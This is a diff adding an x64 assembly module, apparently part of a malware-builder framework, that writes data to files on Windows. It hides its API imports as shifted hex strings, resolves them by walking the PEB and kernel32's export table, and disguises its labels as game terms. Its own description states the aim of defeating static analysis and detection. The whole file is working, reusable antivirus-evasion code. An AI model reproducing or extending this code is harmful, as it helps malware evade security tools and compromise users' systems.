@@ -1,0 +1,519 @@
+#!name##AsmUnloader
+#!types##support
+#!subTypes##lib
+#!info##Assembler [x64] [W] A module responsible for writing files to disk using the technique of hidden dynamic imports directly from system memory. The imported functions are stored as inflated hexadecimal values inside regular variables as plain text, making static analysis and detection more difficult.
+#!options##LIB_COMPILER##mingw-x64
+#!options##DLL_NO_DLL##True
+#!lang##asm
+#!system_FLAG##[W]
+#!reqVar##AU_enc_byte##Increase the 'hex' value of each character in variable names.##int
+#!setVar##AU_enc_byte##2##int
+#!reqVar##AU_file_name##Default file name##str
+#!setVar##AU_file_name##minecraft.txt##str
+
+bits 64
+default rel
+
+extern lstrcmpA
+
+global UN_PlayerItems   ; Save data to file (use default file name)
+global UN_PlayerItem    ; Save data to file
+global UN_GetPlayerName ; return file handle ready to write
+
+%define FILE_GENERIC_ALL 0x10000000
+%define FILE_ATTRIBUTE_NORMAL 0x80
+%define FILE_NAME_BUFF 512
+%define DUCK_TALES_BUFF_LEN 128
+%define DUCK_TALES_DISCOVER {{AU_enc_byte}}   ; number decryption bytes
+
+section .data  
+    UN_default_player_name: db "{{AU_file_name}}", 0   
+    UN_enemy_cfa: db {{TOOL.asm_hex_encrypt_bytes("CreateFileA", AU_enc_byte)}} ; CreateFileA
+    UN_enemy_wf: db {{TOOL.asm_hex_encrypt_bytes("WriteFile", AU_enc_byte)}} ; WriteFile
+    UN_enemy_gmf: db {{TOOL.asm_hex_encrypt_bytes("GetModuleFileNameA", AU_enc_byte)}} ; GetModuleFileNameA
+    UN_enemy_ch: db {{TOOL.asm_hex_encrypt_bytes("CloseHandle", AU_enc_byte)}} ; CloseHandle  
+    UN_enemy_prfs_d: db {{TOOL.asm_hex_encrypt_bytes("Shlwapi.dll", AU_enc_byte)}} ; Shlwapi.dll
+    UN_enemy_prfs: db {{TOOL.asm_hex_encrypt_bytes("PathRemoveFileSpecA", AU_enc_byte)}} ; PathRemoveFileSpecA req: Shlwapi.dll
+    UN_enemy_pca: db {{TOOL.asm_hex_encrypt_bytes("PathCombineA", AU_enc_byte)}} ; PathCombineA req: Shlwapi.dll
+    
+    DT_player_item1: db {{TOOL.asm_hex_encrypt_bytes("LoadLibraryA", AU_enc_byte)}} ; LoadLibraryA
+    DT_player_item2: db {{TOOL.asm_hex_encrypt_bytes("GetProcAddress", AU_enc_byte)}}    ; GetProcAddress
+    
+section .bss
+    UN_player_name: resq 1  ; file name
+    UN_player_hp: resq 1    ; file handler
+    UN_player_life: resb FILE_NAME_BUFF   ; buffer for created file path
+    UN_player_inv: resb FILE_NAME_BUFF    ; buffer for exe file path
+    UN_player_data: resq 1  ; data pointer
+    UN_player_num: resq 1   ; bytes number
+    UN_player_prfs: resq 1  ; PathRemoveFileSpecA address
+    UN_player_pca: resq 1   ; PathCombineA address
+    UN_player_gmf: resq 1   ; GetModuleFileNameA address
+    
+    DT_Chest: resq 1    ; kernel32.dll address
+    DT_McDuck: resq 1   ; Export Table address
+    DT_ship1: resq 1    ; LoadLibraryA
+    DT_ship2: resq 1    ; GetProcAddress
+    DT_ship_hold: resb DUCK_TALES_BUFF_LEN  ; buffer
+    DT_ship_hold2: resb DUCK_TALES_BUFF_LEN  ; buffer
+    
+section .text
+
+;--------------------------------- Shadow Unloader ----------------------------------------------
+
+UN_PlayerItems:
+; Save data to file (use default)
+; REQUIREMENTS: stack allign to 16
+; IN: rdx - data pointer
+; IN: r8 - number bytes to write
+; OUT: rax - pointer to file path
+    push rbp
+    mov rbp, rsp
+    push rcx
+    
+    sub rsp, 40
+    mov rcx, 0
+    call UN_GetPlayerName
+    add rsp, 40
+    
+    sub rsp, 40
+    mov rcx, rax
+    call UN_PlayerItem
+    add rsp, 40
+    
+    pop rcx
+    pop rbp
+    ret
+
+UN_PlayerItem:
+; Save data to file
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - file handle
+; IN: rdx - data pointer
+; IN: r8 - number bytes to write
+; OUT: rax - pointer to file path
+
+    push rbp
+    mov rbp, rsp
+    push r9
+    
+    ; save var
+    lea r9, [UN_player_hp]
+    mov [r9], rcx   ; save handler    
+    lea r9, [UN_player_data]
+    mov [r9], rdx   ; save data pointer   
+    lea r9, [UN_player_num]
+    mov [r9], r8    ; save number bytes
+    
+    ; Get WriteFile
+    sub rsp, 40
+    mov rcx, UN_enemy_wf
+    call _DT_GetItem
+    add rsp, 40
+    
+    
+    ; write to file
+    sub rsp, 56 ;shadow space
+    lea rcx, [UN_player_hp]
+    mov rcx, [rcx]
+    lea rdx, [UN_player_data]
+    mov rdx, [rdx]
+    lea r8, [UN_player_num]
+    mov r8, [r8]  ; number bytes to write
+    mov r9, 0   ; [out, optional] lpNumberOfBytesWritten
+    mov qword [rsp+32], 0   ; [in, out, optional] lpOverlapped
+    call rax    ; execute WriteFile
+    add rsp, 56 ;restore stack
+    
+    ; get file path
+    ; get function addr
+    sub rsp, 40 ;shadow space
+    mov rcx, UN_enemy_prfs
+    mov rdx, UN_enemy_prfs_d
+    call _DT_GetDuck
+    lea rcx, [UN_player_prfs]
+    mov [rcx], rax  ; save PathRemoveFileSpecA addr
+    mov rcx, UN_enemy_pca
+    mov rdx, UN_enemy_prfs_d
+    call _DT_GetDuck
+    lea rcx, [UN_player_pca]
+    mov [rcx], rax  ; save PathCombineA addr
+    mov rcx, UN_enemy_gmf
+    call _DT_GetItem
+    lea rcx, [UN_player_gmf]
+    mov [rcx], rax  ; save GetModuleFileNameA addr
+    add rsp, 40 ;restore stack
+    
+    ; build file path
+    sub rsp, 40 ; shadow space
+    mov rcx, 0
+    lea rdx, [UN_player_inv]
+    mov r8, FILE_NAME_BUFF
+    call rax    ; exec GetModuleFileNameA
+    
+    lea rcx, [UN_player_inv]
+    lea rax, [UN_player_prfs]
+    mov rax, [rax]
+    call rax    ; exec PathRemoveFileSpecA
+    
+    lea rcx, [UN_player_life]
+    lea rdx, [UN_player_inv]
+    lea r8, [UN_player_name]
+    mov r8, [r8]
+    lea rax, [UN_player_pca]
+    mov rax, [rax]
+    call rax    ; exec PathCombineA  
+    add rsp, 40 ;restore stack
+    
+    ; return file path
+    lea rax, [UN_player_life]
+    
+    pop r9
+    pop rbp
+    ret
+
+UN_GetPlayerName:
+; get file handle ready to write
+; REQUIREMENTS: stack allign to 16
+; IN [optional] rcx - file name or '0'
+; OUT: rax - file handl
+
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push rcx
+    push rdx
+    push r8
+    push r9
+    
+    cmp rcx, 0
+    je .use_default
+    .begin:
+        ; save file name
+        lea rdx, [UN_player_name]
+        mov [rdx], rcx
+        
+        ; get CreateFileA
+        sub rsp, 40
+        mov rcx, UN_enemy_cfa
+        call _DT_GetItem
+        add rsp, 40
+
+        ; CreateFileA
+        sub rsp, 72
+        lea rcx, [UN_player_name]
+        mov rcx, [rcx]
+        mov rdx, FILE_GENERIC_ALL
+        mov r8, 0
+        mov r9, 0
+        mov qword [rsp+32], 2   ;[in] dwCreationDisposition
+        mov qword [rsp+40], FILE_ATTRIBUTE_NORMAL     ; [in] dwFlagsAndAttributes
+        mov qword [rsp+48], 0     ; [in, optional] hTemplateFile
+        call rax
+        add rsp, 72
+        lea rbx, [UN_player_hp]
+        mov [rbx], rax  ; save file handler
+          
+    .return:
+        pop r9
+        pop r8
+        pop rdx
+        pop rcx
+        pop rbx
+        pop rbp
+        ret
+    
+    .use_default:
+        mov rcx, UN_default_player_name
+        jmp .begin
+
+        
+
+;---------------------------------------- Duck Tales --------------------------------------
+
+%macro _DT_mCopy 2
+    push rsi
+    push rdi
+    push rcx
+    push rax
+    ; load buffer
+    lea rsi, %1
+    lea rdi, %2
+    
+     ;reset dest buffer
+     xor rcx, rcx
+     .mCopy_clear:
+        cmp rcx, DUCK_TALES_BUFF_LEN
+        je .mCopy_begin
+        mov byte[rdi + rcx], 0
+        inc rcx
+        jmp .mCopy_clear
+    
+    .mCopy_begin:
+        xor rcx, rcx
+        xor rax, rax
+        .mCopy_loop:
+            cmp rcx, DUCK_TALES_BUFF_LEN
+            je .mCopy_end
+            mov al, [rsi + rcx]
+            mov [rdi + rcx], al
+            inc rcx
+            jmp .mCopy_loop           
+    .mCopy_end:
+        pop rax
+        pop rcx
+        pop rdi
+        pop rsi   
+%endmacro
+
+_DT_GetDuck:
+; load DLL and get function address
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - encoded function name
+; IN: rdx - encoded dll name
+; OUT: rax - function address or 0
+    push rbp
+    mov rbp, rsp
+    sub rsp, 64 ; shadow space
+    mov [rbp-8], rcx    ; save function name
+    mov [rbp-16], rdx   ; save dll name
+      
+    ; check if load library address exists
+    lea rax, [DT_ship1]
+    mov rax, [rax]
+    cmp rax, 0
+    je .loading
+    
+    .begin:
+        ; decode function name
+        mov rcx, [rbp-8]
+        call _DT_discover_item
+        ; copy function name
+        _DT_mCopy DT_ship_hold, DT_ship_hold2
+        ; decode dll name
+        mov rcx, [rbp-16]
+        call _DT_discover_item
+        ; DT_ship_hold - dll name
+        ; DT_ship_hold2 - function name
+        
+        ; load dll
+        lea rax, [DT_ship1] ; get LoadLibraryA address
+        mov rax, [rax]
+        lea rcx, DT_ship_hold   ; pointer to dll name
+        call rax    ; execute LoadLibraryA
+        cmp rax, 0
+        je .return
+
+        ; load function
+        mov rcx, rax
+        lea rdx, DT_ship_hold2  ; pointer to function name
+        lea rax, [DT_ship2] ; get GetProcAddress address
+        mov rax, [rax]  ; execute function
+        call rax
+        
+    .return:
+        add rsp, 64 ;restore stack
+        pop rbp
+        ret
+    
+    .loading:
+        mov rcx, DT_player_item1
+        call _DT_GetItem    ; get LoadLibraryA
+        lea rcx, [DT_ship1]
+        mov [rcx], rax  ; save address
+        mov rcx, DT_player_item2
+        call _DT_GetItem    ; get GetProcAddress
+        lea rcx, [DT_ship2]
+        mov [rcx], rax  ; save address
+        jmp .begin
+
+_DT_GetItem:
+; get function address from kernel32
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - encoded function name
+; OUT: rax - function address
+    push rbp
+    mov rbp, rsp
+    ; r13 - kernel32 addr
+    ; r14 - Export Table addr
+    ; rbx - Number of functions
+    ; rsi - counter
+    ; r15 - temp memory
+    push r13
+    push r14
+    push rbx
+    push rsi
+    push r15
+    push rcx
+    push rdx
+    push r8
+    push r9
+    push r10
+    push r11
+    
+     ; decode and save function name
+    sub rsp, 40
+    call _DT_discover_item
+    add rsp, 40
+    
+    
+    ; check if Export Table address exist
+    lea rax, [DT_McDuck]
+    mov rax, [rax]
+    cmp rax, 0
+    je .discover_chest
+    .begin:
+        lea r13, [DT_Chest]
+        mov r13, [r13]  ; kernel32 address
+        lea r14, [DT_McDuck]
+        mov r14, [r14]  ; ; Export Table address
+        mov ebx, [r14+0x14] ; get number of function
+        xor rsi, rsi    ; reset counter
+    
+    .loop:
+        cmp rsi, rbx    ; if counter > number of functions
+        jg .not_find
+         ; get Function name
+        mov r15d, [r14+0x20]    ; RVA function name
+        add r15, r13    ; RVA function name + kernel32 address
+        mov r15d, [r15 + 4 * rsi]   ; get next entry RVA function name in table
+        add r15, r13    ; function name + kernel32 address
+        
+        ; compare function name
+        sub rsp, 40 ;shadow space
+        mov rcx, r15
+        lea rdx, [DT_ship_hold]
+        call lstrcmpA
+        add rsp, 40 ; restore stack
+        
+        cmp rax, 0
+        je .finded
+        
+        ; counter = counter + 1
+        inc rsi
+        jmp .loop
+    
+    .return:
+        pop r11
+        pop r10
+        pop r9
+        pop r8
+        pop rdx
+        pop rcx
+        pop r15
+        pop rsi
+        pop rbx
+        pop r14
+        pop r13
+        pop rbp
+        ret
+    
+    .finded:
+        mov eax, [r14 + 0x24]   ; get AddressOfNameOrdinals RVA (dword)
+        add rax, r13    ; Name Ordinals + kernel32 address
+        xor rcx, rcx
+        mov cx, [rax + 2 * rsi] ; get function index (word) to function address
+        mov eax, [r14 + 0x1c]   ; get AddressOfFunctions RVA
+        add rax, r13    ; Address of function + kernel32 address
+        mov ecx, [rax + 4 * rcx]    ; get RVA function address
+        add rcx, r13    ; function address + kernel32 address
+        
+        mov rax, rcx    ; return function address
+        jmp .return
+    
+    .not_find:
+        xor rax, rax    ; return None
+        jmp .return
+    
+    .discover_chest:
+        sub rsp, 40
+        call _DT_discover_chest
+        add rsp, 40
+        jmp .begin
+
+_DT_discover_item:
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - pointer to encoded func name
+; OUT: rax - pointer to DT_ship_hold - decoded func name
+
+%macro _DT_discover_show 1
+    %rep %1
+        dec al
+    %endrep
+%endmacro
+
+    push rbp
+    mov rbp, rsp
+    push rcx
+    push rsi
+    push rdi
+    
+    ; clear buffer
+    xor rsi, rsi    ; counter
+    lea rdi, [DT_ship_hold]
+    .clear_loop:
+        cmp rsi, DUCK_TALES_BUFF_LEN
+        je .clear_end
+        mov byte [rdi + rsi], 0
+        inc rsi
+        jmp .clear_loop
+    
+    .clear_end:
+        xor rsi, rsi
+        xor rax, rax
+    ;decode func name
+    .loop:
+        mov byte al, [rcx + rsi]    ; move encode bytes to al
+        cmp al, 0
+        je .return
+        _DT_discover_show DUCK_TALES_DISCOVER
+        mov byte [rdi + rsi], al    ; move decoded byte to buffer
+        inc rsi ;   counter + 1
+        jmp .loop
+        
+    .return:
+        lea rax, [DT_ship_hold]
+        pop rdi
+        pop rsi
+        pop rcx
+        pop rbp
+        ret
+
+
+
+_DT_discover_chest:
+; find kernel32 and export table address
+; REQUIREMENTS: stack allign to 16
+; OUT: DT_Chest, DT_McDuck
+    push rbp
+    mov rbp, rsp
+    push rbx    ; save rbx
+    push rsi    ; save rsi
+    push rdi    ; save rdi
+   
+    xor rbx, rbx
+    mov rbx, gs:[0x60]  ; Get address of PEB struct
+    mov rbx, [rbx+0x18] ; Get PEB_LDR_DATA address
+    mov rbx, [rbx+0x20] ; Get InMemoryOrderModuleList
+    mov rbx, [rbx]  ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
+    mov rbx, [rbx]  ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
+    mov rsi, [rbx+0x20]  ; Get kernel32.dll address
+    lea rdi, [DT_Chest]
+    mov [rdi], rsi  ; save kernel32.dll address
+    
+    xor rdi, rdi
+    mov edi, [rsi + 0x3c]   ; RVA PE file signature
+    add rdi, rsi    ; RVA PE + kernel32 addr
+    add rdi, 0x88   ; 0x88 bytes after the PE signature is the RVA for the Export Table
+    mov edi, [rdi]  ; get RVA Export Table
+    add rdi, rsi    ; RVA Export Table + kernel32 address
+    lea rbx, [DT_McDuck]
+    mov [rbx], rdi  ; save Export Table address
+
+    ; restore registry
+    pop rdi
+    pop rsi
+    pop rbx
+    pop rbp
+    ret
+
